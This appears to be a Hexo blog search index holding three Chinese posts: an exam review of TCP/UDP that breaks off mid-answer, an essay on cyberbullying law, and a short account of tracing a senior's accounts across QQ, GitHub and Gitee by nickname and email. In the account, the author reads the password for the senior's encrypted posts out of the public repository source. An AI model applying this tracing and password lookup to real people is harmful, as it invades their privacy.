<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>小小的社工</title>
    <url>/2021/01/23/%E5%B0%8F%E5%B0%8F%E7%9A%84%E7%A4%BE%E5%B7%A5/</url>
    <content><![CDATA[<center><font color=red>用hexo搭建的个人博客有必要加密吗？</font></center>

<h4 id="找大佬的博客"><a href="#找大佬的博客" class="headerlink" title="找大佬的博客"></a><font color=blue>找大佬的博客</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一般而言，大多数人的各个平台的ID基本上都是一样的。所以首先来到大佬的QQ界面，发现他的昵称，然后直接在百度上面搜索发现Gitee账号，但是这个风格显然与大佬的不同，pass掉！</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了昵称，在QQ界面还发现了一个邮箱的账号，有没有可能成功呢？百度搜索后找到了一个Github的账号，点进去发现头像与QQ头像风格相似。发现了一个xx.github.io的一个库，刚好自己也通过github搭建过自己的博客平台，很轻松就找到了个人博客的地址。进入博客发现昵称与大佬QQ昵称一模一样，很显然我成功了。</p>
<h4 id="部分文章需要密码如何破解"><a href="#部分文章需要密码如何破解" class="headerlink" title="部分文章需要密码如何破解"></a><font color=blue>部分文章需要密码如何破解</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不得不说，大佬真的厉害，博客更新的也很勤快，令人敬佩！但是翻到后面我发现某些文章需要密码才能进入，这可如何是好？</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有源码都上传到了github上面，所以密码也必定能找到。首先我把xx.github.io那个库全部都克隆到本地。参考 <a href="https://www.jianshu.com/p/a2330937de6c">Hexo文章简单加密访问</a>知道一般加密都在文章的头部，然而并没有什么卵用。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;仔细观察原博客，发现只要点击加密的文章就会跳转到一个固定的页面。在源码中查找该页面，直接得到密码。输入密码，成功进入文章。</p>
<center><img src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210123114234.png"></center>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此之外，还能得到大佬的Gitee账号地址，虽然什么东西都没有！笑哭.jpg</p>
<h4 id="启示"><a href="#启示" class="headerlink" title="启示"></a><font color=blue>启示</font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到这种机密方式是十分不安全的(实际上，静态网站怎么加密也没多大意义)。如果真的想让文章仅个人浏览，建议把仓库设为私密！</p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title>从安全法规角度对网络暴力浅析</title>
    <url>/2021/01/21/%E4%BB%8E%E5%AE%89%E5%85%A8%E6%B3%95%E8%A7%84%E8%A7%92%E5%BA%A6%E5%AF%B9%E7%BD%91%E7%BB%9C%E6%9A%B4%E5%8A%9B%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<p><b>摘要：</b><font color=#f92672> 随着网络的普及，越来越多的人享受着徜徉在虚拟世界的快感，基于传播技术原理、传播背景、心理因素、社会因素等形成的网络舆论应运而生，逐渐演化为一种暴力事件，对道德约束、法律控制、舆论导向造成了很大的挑战。解决这些问题单凭公民自我道德的软约束，很难得到控制，因此加强网络舆论安全法律法规，构建完备的安全监管及联动应急机制，提升当事人的自我防范意识等措施变得尤为重要。</font></p>
<p><b>关键词： 网络暴力，法律法规，道德文化，规范治理 </b></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;互联网的出现很大程度的丰富了我们的生活，让我们和世界接触的更加紧密，但是人肉搜索、恶意营销、信息泄露等“网络暴力”事件也随之接踵而来，尤其是近几年，此起彼伏的讨伐网络“键盘侠”声音让我们不得不重视这种精神暴力行为。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据百度解释，“网络暴力”是一种危害严重、影响恶劣的暴力形式，是社会暴力在网络上的延伸。网络暴力不同于现实生活中拳脚相加血肉相搏的暴力行为，而是借助网络的虚拟空间用语言文字对人进行伤害和污蔑。这些恶语相向的言论、图片、视频的发表者，往往是一定规模数量的网民们，因网络上发布的一些违背人类公共道德和传统价值观念以及触及人类道德底线的事件所发的言论。这些语言、文字、图片、视频都具有恶毒、尖酸刻薄、残忍凶暴等基本特点，已经超出了对于这些事件正常的评论范围，不但对事件当事人进行人身攻击，恶意诋毁，更将这种伤害行为从虚拟网络转移到现实社会中，对事件当事人进行“人肉搜索”，将其真实身份、姓名、照片、生活细节等个人隐私公布于众。这些评论与做法，不但严重地影响了事件当事人的精神状态，更破坏了当事人的工作、学习和生活秩序，甚至造成严重的后果。</p>
<h2 id="1-网络暴力成因"><a href="#1-网络暴力成因" class="headerlink" title="1. 网络暴力成因"></a><center>1. 网络暴力成因</center></h2><h3 id="1-1-社会环境"><a href="#1-1-社会环境" class="headerlink" title="1.1. 社会环境"></a>1.1. 社会环境</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;权利以及自由在我国受到法律的认可，但是真正的自由以及权利却在现实中受到限制，人的一些欲望在主流文化中处于被压制的状态，网络媒体恰恰摆脱了传统的墨守成规的死板印象，现实生活中本该遵守的规范和约束在网络传播中失去了应有的约束力，网民通过论坛以及博客和微博都可轻易发表自己的观点，这也从而导致了许多在现实中得不到重视、希望寻找自我存在感、获得自我价值的人更愿意去网络中寻求一种平衡点。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;继国家经济实现快速的发展，一些社会问题也随之而来，“一切向钱看齐”的拜金主义，盲目崇拜“小鲜肉”、用颜值衡量个人价值的错误思想在一定程度上影响了整个社会的大环境，加重了人的戾气。网络暴力正是在这样的大背景下诞生的。</p>
<h3 id="1-2-网络环境"><a href="#1-2-网络环境" class="headerlink" title="1.2. 网络环境"></a>1.2. 网络环境</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络的可匿名性给网民提供了更大的自由空间，增加了网民的安全感，促进了网络暴力的发生概率。关于匿名性，比斯坦纳的漫画很是直观的体现了这一点—— 两只坐在电脑前的狗在对话：“在互联网上，没有人知道你是条狗”。确实如此，在网络环境中，网络使用者凭借着一个个昵称、代号就可以隐匿自己的大部分信息，匿名性和匿名行为已经俨然成为网络社会建立的基础之一。<br>今年宋慧乔和宋仲基离婚一事闹得沸沸扬扬，流言蜚语、“荡妇羞辱”都奔宋慧乔而去。她向警方举报了15个网络ID，结果其中13名迅速注销了账号，警方无法核实被举报人的身份，所以无法诉诸法律。只需换个马甲，“键盘侠”们又能接着去伤害别人。匿名的使用使得网民穿着一层邪恶的外衣，不再担心受到道德以及法律责任的惩罚，彻底释放内心中邪恶的自己，开始宣泄式的恶意攻击。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;伴随着网络商业化运作模式的普遍介入，无形中催生了大量的网络推手. 一些公司、网站、商家为了追求较多的商业利益，弃公民道德和社会责任于不顾，通过发布一些具有煽动性的标题来获得网民的关注，甚至鼓动网友水军、营销号对相关内容进行暗箱操作，诋毁、打压对自己有影响的对手，引领舆论风向，对网民非理性的网络舆论推波助澜，以达到捧红艺人、炒作自己、制造噱头、吸引眼球、积聚声势等目的，这也使得网络环境进一步的恶化。</p>
<h3 id="1-3-个人因素"><a href="#1-3-个人因素" class="headerlink" title="1.3. 个人因素"></a>1.3. 个人因素</h3><h4 id="1-3-1-网民自我道德缺失"><a href="#1-3-1-网民自我道德缺失" class="headerlink" title="1.3.1. 网民自我道德缺失"></a>1.3.1. 网民自我道德缺失</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网民道德的缺失也是网络暴力形成很关键的原因。韩国艺人崔雪莉的自杀与之前受到的网络恶评不无关系。当时刷屏的“没有一片雪花是无辜的”是否说明了恶评者会有悔意和反思，SBS电视台的采访告诉我们：并没有。《想知道真相》节目组采访了曾在网络上攻击过雪莉的网民，有人面对证据仍然抵赖：“我发过这句话吗？完全想不起来了”；有人认为又不是自己发表言论那天雪莉自杀的，不应该归咎责任与自己，会影响自己的心情；还有人不觉得自己的行为有什么问题，觉得当艺人就要承受这些诋毁。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;心理学研究者认为，人格的阴暗面具有强大的冲击力，平时在现实生活中隐藏在潜意识里面的阴暗面在互联网上面可以毫无顾忌的扩张，理性的成分被最大程度的限制，最终成为网络的施暴者。</p>
<h4 id="1-3-2-网民的非理性心理"><a href="#1-3-2-网民的非理性心理" class="headerlink" title="1.3.2. 网民的非理性心理"></a>1.3.2. 网民的非理性心理</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实网络暴力出现的时间很早，它伴随着互联网的开始就已经出现了，那时的暴力表现形式一般为直白而粗俗的流氓话语，这一般对于成年人来说很难造成伤害。而这几年处于舆论的风口浪尖的网络暴力主要集中于对当事人到的人格进行攻击，集中于网络群体对个体的公共道德审判，严重一点的直接被人肉搜索，曝光隐私，牵连到自己以及家人的声誉甚至生命安全。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;消极的道德判断是网络暴力产生的心理条件，网民总是自认为站在道德的“制高点”，在一个事情未经证实之前就急急忙忙站队，盲目跟风发表过激的言论，之后过高的点击率使得事件进一步的扩大化，给了当事人不道德的审判。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“我爸是李刚”可谓是这种心理的典型事件。2010年10月16万21是40分许，在河北大学新区超市前，一辆黑色轿车将两名女生撞出数米远，其中一个傍晚经抢救无效死亡，另一个身受重伤。肇事者口出狂言：“有本事你们告去，我爸是李刚”。此事一出迅速成为网友和媒体热议的焦点。“我爸是李刚”成为网民嘲讽嚣张跋扈的富二代的流行语。猫扑网最先发起了名为“‘我爸是李刚’造句大赛”的活动，参与者迅速过万，还有很多人借此改编名言名句，表达自己的愤怒和嘲讽。然而李某是否说过以及在何种情景下说的此话并未经证实。是的，当人们陷入群体狂欢的时候，几乎是没有自主思考能力的。网络信息的不对称性和“三人成虎”的可怕舆论传播，伴随着人肉搜索给当事人造成了巨大的负面影响，甚至网络当中与李刚同名同姓的人也不堪遭受骚扰和攻击。</p>
<h2 id="2-网络暴力造成的危害"><a href="#2-网络暴力造成的危害" class="headerlink" title="2. 网络暴力造成的危害"></a><center>2. 网络暴力造成的危害</center></h2><h3 id="2-1-对当事人造成很大的伤害"><a href="#2-1-对当事人造成很大的伤害" class="headerlink" title="2.1.对当事人造成很大的伤害"></a>2.1.对当事人造成很大的伤害</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与网暴者的抗争更多的时候让人疲惫、愤怒，甚至心碎。也许会有人质疑为什么亲子综艺别整顿停播，也许知道澳大利亚的14岁女孩自杀事件后，大家会有所改观。Akubra是澳大利亚十分有名的时尚阔边帽品牌，6岁女孩Amy Everett成为了他们的广告模特，广受好评，随后随着曝光量的增加，艾米的知名度越来越高，他的噩梦也开始了，在他成长的路上有很多人嘲讽他变胖了、长残了，14岁那年，不堪欺辱的艾米选择了自杀。花季少女因网暴自杀，想想都让人不能释怀。除此之外，全网黑蔡徐坤唱跳rap篮球、调侃六小龄童文体两开花、网暴汪峰占据歌坛半壁等等一系列的事件，无一不对当事人造成负面的影响。作为明星的他们，一旦为自己发声明，就会受到二次伤害，被指没有度量，于是只能默默承受着，也因此很多艺人因长期承受舆论的压力患上抑郁症，更甚至自杀身亡。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶毒的语言往往伤害人于无形当中，键盘侠抱着不负责任的心理肆意而为，他们很少考虑到当事人的感受。也许当事人确实有的地方做的不太对，他们那需要道德谴责，需要法律制裁，但绝对不需要披着道德外衣打着正义旗帜的暴力去解决。</p>
<h3 id="2-2-影响网民的道德价值观"><a href="#2-2-影响网民的道德价值观" class="headerlink" title="2.2.影响网民的道德价值观"></a>2.2.影响网民的道德价值观</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了直接造成危害和影响外，网络暴力的频繁发生会影响网民的价值观。人们的道德价值观念无时无刻不在影响人们的行为和处事方式。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前段时间很受关注的西安奔驰时间女主，他想挑战的是行业的潜规则，他想维护的是所有消费者的权益。然而有很多人质疑女车主是在自我炒作，他家里的亲戚朋友都受到了“围攻”，承受了很大的压力。“明明是正当的维权，但硬被说成是某策划公司的炒作，还有人说我是演员。现在，我有几百个身份”，这是当事人的原话，从中不难听到心酸。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;花总曝光五星级酒店的卫生乱象后，被酒店精准打击，还遭到了死亡威胁，只能回到老家躲起来，被人质疑“这人是想红吧？”，气的花总直接取消了微博新关注的功能。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最可怕的不是被键盘侠们臆测，不是污名化和泼脏水，是经过这么一遭，敢于为公众维权的人也怕了，后悔出头了。事后，花总向媒体坦言：“今后不再做类似的事，感觉没有余力了”，还说“等热度消退后，最终只有我一个人要去面对事件造成的后果”。可能他感受到了社会深深的恶意，变得心灰意冷。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;英雄落寞，不可谓不凄凉。如果挺身而出的成本如此之高，还要被质疑是炒作，下次谁还会为公众利益挺身而出？</p>
<h3 id="2-3-阻碍构建和谐社会"><a href="#2-3-阻碍构建和谐社会" class="headerlink" title="2.3.阻碍构建和谐社会"></a>2.3.阻碍构建和谐社会</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络暴力虽然是发生虚拟的网络环境中，但是他是现实社会中暴力的扩展和延伸，最终又会回归到现实中。网络暴力的发生指向的是现实社会中的具体时间，这种暴力虽然没有直接影响到人的生命健康，没有现实社会的暴力事件那样的极端化和暴力化，但是它给社会造成的危害和由此引发的社会稳定因素更要引发人们的关注，因为施暴者往往不能受到法律的制裁，他们可以肆意的参与多次施暴，显然代价小的多了。</p>
<h2 id="3-针对网络暴力的规范策略"><a href="#3-针对网络暴力的规范策略" class="headerlink" title="3. 针对网络暴力的规范策略"></a><center>3. 针对网络暴力的规范策略</center></h2><h3 id="3-1-提高网民媒介的责任感"><a href="#3-1-提高网民媒介的责任感" class="headerlink" title="3.1. 提高网民媒介的责任感"></a>3.1. 提高网民媒介的责任感</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网民是网络暴力的主体，所以提高网民的网络素养和道德底线尤为重要。对于网民，可以要通过行之有效的宣传教育，强化网络伦理道德教育及网络“慎独”境界的教育，提高网民特别是广大青少年的道德自律意识，增强他们的分辨能力、选择能力和对低俗文化的免疫力，提高他们的自我评价、自我选择、自我约束、自我规划等内在的道德制约力，培养健康的心态和健全的人格，使其网络行为能够自觉地处于道德规范的引导之下，在思想上筑起抵制盲目跟风的防线。同时，要增强主题实践网络道德行为的自觉性，增强主体的情感体验，以道德的外在制约力明确网络禁忌，从而促使健康网络环境的形成，让人们对网络产生安全感、归宿感和温馨感。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于一些公司、网站、商家，提倡公平竞争，提升自我品牌的实力、提高个人魅力才能使自在竞争中处于不败之地，一时的非正规途径打压很难让自身得到长久的收益，最怕的莫过于竹篮打水一场空。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于主流媒介，在社会舆论引导方面尤其是在面对网络舆情危机方面承担着重要责任。网络社会中发生越轨行为时，主流媒体应该履行好自己的职责。与相关部门进行合作，加强网络舆伦的管理和监控，客观、准确的报道新闻，万不可传播虚假消息。</p>
<h3 id="3-2-增强网站管理"><a href="#3-2-增强网站管理" class="headerlink" title="3.2.  增强网站管理"></a>3.2.  增强网站管理</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络的虚拟性和匿名性是网络魅力所在，也是网络传播秩序规范和道德建设最大的难题。没有实名制的网络环境中，黑衣人有点太多了，没有人像马丁路德金一样去国会山上呐喊，大家忙着在网络上以黑衣人的身份寻找下一个想制裁的对象，以键盘为矛，以屏幕为盾，黑衣人在网上重拳出击，忽视了显示社会的伦理与价值观，对当事人的关注大于事件本身，肆意侵犯个人隐私，不计后果的诽谤他人名誉。自由是有边界的，不负责任的自由并不存在，如若建立网络实名制，强调网络中个人的责任意识和法律意识，线上线下就没有了虚拟与现实的区别，每个人都要为自己的言行负责。每一条的评论，每一条的转发，都要有自己的思考。很显然，实行网络实名制，即网民在互联网中的发表言论和一些网络行为必须用个人真实信息进行登录，这会增加网民参与网暴的风险和成本，对网络中的谩骂和人身攻击进行了限制，势必会降低网络舆论的传播和扩散。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;各大网站还可以对有网络暴力倾向的语言自动进行屏蔽并删除，对进行网络暴力的网民进行封号警告，严重者交由法院处理。</p>
<h3 id="3-3-加强政府管理"><a href="#3-3-加强政府管理" class="headerlink" title="3.3. 加强政府管理"></a>3.3. 加强政府管理</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建信息监管平台，设置专业网评队伍。面对网络暴力愈演愈烈的局面，政府应当处于主导地位，把握舆论方向，对网络舆论进行引导，用法律法规去约束和规范网络行为。政府应当设立一个较大的公关信息平台，其时刻关注网络动态，利用专业网评队伍对相关有争议的时间进行深度剖析，对网络舆论走向进行预测，及时的做好舆论导向作用，及时公开信息，使公众能够及早了解事情的真想，而不至于整体舆论方向走偏。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;《网络安全法》已经对网络暴力画出了红线，但受害者依法为全市却面临举证困难等诸多问题。如何让维权变得便捷、让司法变得高效，这是破解施暴者嚣张、受害者沉默倒挂现象的关键，应该受到相关部门的重视。</p>
<h3 id="3-4-健全法律法规"><a href="#3-4-健全法律法规" class="headerlink" title="3.4. 健全法律法规"></a>3.4. 健全法律法规</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络暴力的遏制需要从根本上入手，即通过健全法律法规来规范网络。一方面要提高“施暴”成本，对于触及法律法规的言语和个人严肃追究，另一方面要规范和净化网络环境，依法管网、依法办网、依法治网，让法治成为整治网络暴力的铁腕。要做到这点，完善法律间的衔接很有必要。就目前的法律来看，在网络方面立的法律并不少，但是彼此间的协调较为欠缺。倘若一味地强调立法，会一定程度的影响彼此间的衔接，反而滞缓执法、司法的效率，法律体系的完善不应当仅仅只是停留在立法上面，在未来法律解释的重要性会愈加的明显，所以将重心放在法律解释工作上自然很是重要。加强监管从民事侵权行为到行政处罚到刑事犯罪，彼此间的界限需要更多的研究。<br>参考文献 </p>
<p>[1].侯玉波.李昕琳.中国网民网络暴力的动机与影响因素分析[J].哲学社会科学,2017,(01)</p>
<p>[2].赵懿纯.网络暴力现象及整治对策[J].NEW MEDIA RESEARCH, 2019, (15)</p>
<p>[3].林爱珺.网络暴力的伦理追问与秩序重建[J].新闻与传播, 2017, (04)</p>
<p>[4].庄启斌.网络暴力危害及预防研究[J].信息科技探索, 2017, (185)</p>
<p>[5].从法理学角度探讨网络暴力的法律应对[J].法理学论文, 2019</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络（期末复习5、6章）</title>
    <url>/2021/01/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A05%E3%80%816%E7%AB%A0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="第五章-运输层"><a href="#第五章-运输层" class="headerlink" title="第五章 运输层"></a>第五章 运输层</h2><center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101194100.png"></center>
<span id="more"></span>

<p>可靠传输的实现机制：</p>
<ul>
<li>面向连接、流量控制、拥塞控制</li>
<li>差错检测、确认、编号、定时器<br><font color=red>一、 运输层两个主要协议的特点，提供的功能</font><center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101200517.png"></center></li>
</ul>
<p>TCP协议这种逻辑通信信道就相当于一条全双工的可靠信道，UDP协议这种逻辑通信信道是一条不可靠信道。</p>
<p><strong><center><font color=blue>UDP：一种无连接协议</font></center></strong></p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101202814.png"></center>

<p>主要特点：</p>
<ol>
<li><font color=red>UDP是无连接的，</font>发送数据之前不需要建立连接</li>
<li><font color=red>UDP使用尽最大努力交付，</font>不保证可靠交付</li>
<li><font color=red>UDP是面向报文的，</font>UDP一次交付一个完整的报文</li>
<li><font color=red>UDP没有拥塞控制，</font>网络出现拥塞不会使源主机的发送速率降低</li>
<li><font color=red>UDP支持一对一、一对多、多对一和多对多的交互通信</font></li>
<li><font color=red>UDP的首部开销小，</font>只有8个字节，比TCP的20个字节的首部要短。 </li>
</ol>
<p>主要功能：只在IP的数据报服务之上增加了复用、分用和差错检测的功能。</p>
<p>计算校验和的例子：</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101203001.png"></center>



<p><strong><center><font color=blue>TCP：一种面向连接的协议</font></center></strong></p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210101212238.png"></center>

<p>主要特点：</p>
<ol>
<li>TCP是面向连接的运输层协议</li>
<li>每一条TCP连接只能有两个端点，每一条TCP连接只能是点对点的</li>
<li>TCP提供可靠交付的服务</li>
<li>TCP提供全双工通信</li>
<li>面向字节流</li>
</ol>
<p>TCP协议主要功能：</p>
<ol>
<li>完成对数据报的确认、流量控制和网络拥塞</li>
<li>自动检测数据报，并提供错误重发的功能</li>
<li>将多条路径传送的数据报按照原来的顺序进行排列</li>
<li>控制超时重发，自动调整超时值</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li>TCP连接时一条虚连接而不是一条真正的物理连接</li>
<li>TCP对应用进程一次把多长的报文发送到TCP的缓存中是不关心的</li>
<li>TCP根据对方给出的窗口只和当前网络拥塞的程度来决定一个报文段应包含多少个字节</li>
<li>TCP可把太长的数据块划分短一些再传送</li>
<li>TCP也可等待积累有足够多的字节后再构成报文段发送出去</li>
</ul>
<p>TCP的连接：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TCP连接的端点叫做套接字或插口。端口号拼接到IP地址即构成了套接字。<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;套接字socket = (IP地址 ：端口号)</p>
<p><font color=red>二、 TCP发送窗口机制</font><br>TCP连接的每一端都必须设有两个窗口（发送窗口和接收窗口），TCP两端的四个窗口经常处于动态变化之中。</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102095316.png"></center>

<p><strong><font color=orange>具体的内容可以看书本的221~224页，图太多，我就不截了</font></strong></p>
<p>超时重传时间设置：<br>TCP采用了一种自适应算法，它记录一个报文段发出的时间，以及收到相应的确认的时间，这两个时间之差就是报文段的往返时间RTT。</p>
<p>新的RTTs(加权平均往返时间) = (1-α) x (旧的RTTs) + α x (新的RTT样本)</p>
<p>注意：0 ≤ α &lt; 1，若接近于零，表示RTT值更新较慢；若接近于1，表示RTT值更新较快。</p>
<p><font color=red>三、 TCP建立连接</font></p>
<p>运输连接有三个阶段：</p>
<ul>
<li>连接建立</li>
<li>数据传送</li>
<li>连接释放</li>
</ul>
<p>建立连接过程解决的三个问题：</p>
<ol>
<li>要使每一方都能够确知对方的存在</li>
<li>要允许双方协商一些参数</li>
<li>能够对运输实体资源进行分配</li>
</ol>
<p>TCP连接的建立采用客户服务器方式。主动发起连接建立的应用进程叫做客户，被动等待连接建立的应用进程叫做服务器。</p>
<p>TCP建立连接的过程叫做握手，握手需要在客户和服务器之间交换三个TCP报文段，称之为三报文握手。采用三报文握手主要是为了防止已失效的连接请求报文段突然又传送到了，因而产生错误。</p>
<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102113151.png"></center>
<font color=red>四、 TCP的拥塞算法及应用</font>

<p>拥塞：某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。</p>
<p>拥塞引起的重传并不会缓解网络的拥塞，反而会加剧网络的拥塞。</p>
<p>TCP采用基于窗口的方法进行拥塞控制，这种方法属于闭环控制方法。</p>
<center><font color=gren>TCP拥塞控制流程图</font></center>
<center><img width=600 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102111423.png"></center>

<p>TCP的四种拥塞控制算法：</p>
<ul>
<li><p><font color=purple>慢开始</font><br> 拥塞窗口cwnd控制方法：在每收到一个对新的报文段的确认后，可以把拥塞窗口增加最多一个SMSS的数值。拥塞窗口cwnd每次的增加量 = min(N,SMSS)<br> 一个传输轮次所经历的时间其实就是往返时间</p>
 <center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102103626.png"></center>
 
<p> 慢开始门限ssthresh的用法：</p>
<ul>
<li>当cwnd &lt; ssthresh时，使用慢开始算法</li>
<li>当cwnd &gt; ssthresh时，停止使用慢开始算法而该用拥塞避免算法</li>
<li>当cwnd = ssthresh时，都可以使用</li>
</ul>
</li>
<li><p><font color=purple>拥塞避免</font><br>思路：让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送放的拥塞窗口cwnd加1，而不是加倍，使拥塞窗口cwnd按线性规律缓慢增长</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102105150.png"></center>
“拥塞避免”并非指完全能够避免了拥塞，只是说在拥塞避免阶段把拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。</li>
<li><p><font color=purple>快重传</font><br>采用快重传算法可以让发送方尽早知道发生了个别报文段的丢失。</p>
<p>快重传算法首先要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认，即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认。</p>
<p>发送方只要一连接收到三个重复确认，就知道接收方确实没有收到报文段，因而应该立即进行重传。</p>
<center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102110438.png"></center></li>
<li><p><font color=purple>快恢复</font><br>当发送端收到连续三个重复的确认时，由于发送方现在认为网络很可能没有发生拥塞，因此现在不执行慢开始算法，而是执行快恢复算法。</p>
 <center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102110630.png"></center>
 <center><img width=500 src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20210102111207.png"></center></li>
</ul>
<p><strong><a href="https://blog.csdn.net/lonelyooacz/article/details/102986921">详细版本</a></strong></p>
<p><strong><font color=orang size=4>探研：</strong></font></p>
<hr>
<ol>
<li><p><code>若一个应用进程使用运输层的用户数据报UDP，但继续向下交给IP层后，又封装成IP数据报。既然都是数据报，是否可以跳过UDP直接交给IP层？哪些功能UDP提供但IP没有提供？</code></p>
<p>答：IP数据报只能找到目的主机而无法找到目的进程。UDP提供对应用进程的复用和分用功能，并提供对数据部分的差错检验。</p>
</li>
<li><p><code>在停止等待协议中如果不使用编号是否可行</code></p>
<p>答：在现实的数据传输中，很难保证数据的传输既不丢失也不出现差错，所以在停止等待协议中应当使用序号。</p>
</li>
<li><p><code>在使用TCP传送数据时，如果有一个确认报文段丢失了，也不一定会引起与该确认报文段对应的数据的重传。试说明理由。</code></p>
<p>答：因为发送方还未超时重传，就收到了接收方对更高序号的确认。在采用tcp进行数据传输时，接收端发送的确认报文段是对前面收到的正确无误数据的确认，同时告诉发送端自己欲接收的下一个报文段序号值。</p>
